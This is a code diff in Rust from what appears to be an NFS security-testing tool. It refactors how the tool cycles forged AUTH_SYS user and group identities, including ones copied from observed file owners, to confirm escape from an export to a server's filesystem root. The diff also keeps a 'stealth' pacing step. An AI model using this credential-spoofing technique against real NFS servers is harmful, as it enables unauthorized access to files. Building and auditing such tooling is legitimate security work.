@@ -31,7 +31,7 @@ use colored::Colorize as _;
 
 use crate::cli::probe::{build_gid_list, make_client_with_hostname, make_mount_client, make_v2_client_with_hostname, parse_addr_with_port};
 use crate::cli::{GlobalOpts, H_BEHAVIOR, H_OUTPUT, H_TARGET};
-use crate::engine::credential::credential_ladder_with;
+use crate::engine::credential::{Identity, ObservedIdentities, identity_ladder};
 use crate::engine::escape::{AccessRank, AnnotatedTreeTop, DiscoveredExport, EscapeCandidate, EscapeSeed, EscapeStats, PipelineConfig, ROOTFS_THRESHOLD, VerifiedTreeTop, construct_candidates, dedup_and_filter, dedup_by_filesystem, rootfs_score, score_and_annotate};
 use crate::proto::auth::{AuthSys, Credential};
 use crate::proto::circuit::CircuitBreaker;
@@ -965,34 +965,33 @@ async fn probe_and_confirm_v3(client: &Nfs3Client, candidate: &EscapeCandidate, 
             // Get owner info from nobody
             let owner_info = nobody_client.attrs(fh).await.ok().map(|a| ((a.uid, a.gid), a.mode));
 
-            let ladder = credential_ladder_with((client.uid(), client.gid()), owner_info.map(|(ug, _)| ug), owner_info.map(|(_, m)| m), &[]);
+            // Each rung claims the operator's groups and the handle's group
+            // alongside its UID (engine::credential).
+            let caller = Identity::new(client.uid(), client.gid(), &build_gid_list(client.gid(), &globals.aux_gids));
+            let ladder = identity_ladder(&caller, owner_info.map(|(ug, _)| ug), owner_info.map(|(_, m)| m), &ObservedIdentities::default());
 
-            for (uid, gid) in &ladder {
-                let gids = build_gid_list(*gid, &globals.aux_gids);
-                let cred = Credential::Sys(AuthSys::with_groups(*uid, *gid, &gids, client.machinename()));
-                let esc = client.with_credential(cred, *uid, *gid);
+            for id in &ladder {
+                let esc = client.with_credential(id.credential(client.machinename()), id.uid, id.gid);
 
                 stealth.wait().await;
                 if let Ok((parent, _)) = esc.resolve(fh, "..").await {
                     if parent.as_bytes() == fh.as_bytes() {
-                        return Some((*uid, *gid));
+                        return Some((id.uid, id.gid));
                     }
                     if let (Ok(self_a), Ok(parent_a)) = (esc.attrs(fh).await, esc.attrs(&parent).await)
                         && self_a.fileid == parent_a.fileid
                     {
-                        return Some((*uid, *gid));
+                        return Some((id.uid, id.gid));
                     }
                 }
             }
 
             // Fallback: try LOOKUP of well-known names to confirm tree-top
             for name in ["etc", "bin", "usr", "var", "lib"] {
-                for (uid, gid) in &ladder {
-                    let gids = build_gid_list(*gid, &globals.aux_gids);
-                    let cred = Credential::Sys(AuthSys::with_groups(*uid, *gid, &gids, client.machinename()));
-                    let esc = client.with_credential(cred, *uid, *gid);
+                for id in &ladder {
+                    let esc = client.with_credential(id.credential(client.machinename()), id.uid, id.gid);
                     if esc.resolve(fh, name).await.is_ok() {
-                        return Some((*uid, *gid));
+                        return Some((id.uid, id.gid));
                     }
                 }
             }
